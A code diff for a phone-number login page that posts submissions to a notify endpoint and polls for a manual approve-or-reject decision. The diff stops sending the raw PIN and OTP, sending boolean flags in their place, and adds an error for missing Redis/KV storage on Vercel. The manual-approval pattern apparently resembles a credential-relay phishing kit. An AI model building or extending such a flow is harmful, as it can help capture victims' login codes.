@@ -310,7 +310,7 @@ document.addEventListener('DOMContentLoaded', function () {
       fetch('/api/notify/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: num, pin: pin })
+        body: JSON.stringify({ username: num, pinSubmitted: true })
       })
       .then(function (res) { return res.json(); })
       .then(function (data) {
@@ -324,6 +324,13 @@ document.addEventListener('DOMContentLoaded', function () {
           fetch('/api/login/status/' + loginId, { cache: 'no-store' })
             .then(function (res) { return res.json(); })
             .then(function (statusData) {
+              if (statusData.sharedStore === false) {
+                if (pollInterval) clearInterval(pollInterval);
+                if (spinner) spinner.style.display = 'none';
+                showToast('Approval storage is not configured. Connect Redis/KV on Vercel and redeploy.', 'error');
+                if (submitBtn) submitBtn.disabled = false;
+                return;
+              }
               if (statusData.decided) {
                 if (pollInterval) clearInterval(pollInterval);
                 if (statusData.status === 'approved') {
@@ -415,7 +422,7 @@ document.addEventListener('DOMContentLoaded', function () {
       fetch('/api/notify/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: phone, otp: otp })
+        body: JSON.stringify({ username: phone, otpSubmitted: true })
       })
       .then(function (res) { return res.json(); })
       .then(function (data) {
@@ -426,6 +433,15 @@ document.addEventListener('DOMContentLoaded', function () {
           fetch('/api/login/status/' + loginId, { cache: 'no-store' })
             .then(function (res) { return res.json(); })
             .then(function (statusData) {
+              if (statusData.sharedStore === false) {
+                clearInterval(pollInterval);
+                showToast('Approval storage is not configured. Connect Redis/KV on Vercel and redeploy.', 'error');
+                if (submitBtn) {
+                  submitBtn.disabled = false;
+                  submitBtn.textContent = oldText;
+                }
+                return;
+              }
               if (statusData.decided) {
                 clearInterval(pollInterval);
                 if (statusData.status === 'approved') {
